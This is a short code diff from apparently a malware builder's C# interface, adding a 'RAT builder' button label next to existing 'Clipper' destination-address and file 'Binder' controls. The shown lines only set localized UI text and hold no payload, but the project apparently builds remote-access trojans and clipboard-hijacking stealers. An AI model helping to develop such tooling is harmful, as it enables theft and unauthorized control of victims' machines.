@@ -8383,7 +8383,8 @@ Read-Host 'Press Enter to close'
         if (BtnClipperClear        != null) BtnClipperClear.Content     = Lang.Get("ACT_CLEAR");
         if (LblClipperDestAddr     != null) LblClipperDestAddr.Text     = Lang.Get("BND_DEST_ADDR");
 
-        // ── Binder build button ──
+        // ── RAT builder + Binder build buttons ──
+        if (TxtBtnBuild       != null) TxtBtnBuild.Text       = Lang.Get("ACT_BUILD").ToUpper();
         if (BtnBinderBuildTxt != null) BtnBinderBuildTxt.Text = Lang.Get("ACT_BUILD");
     }
 
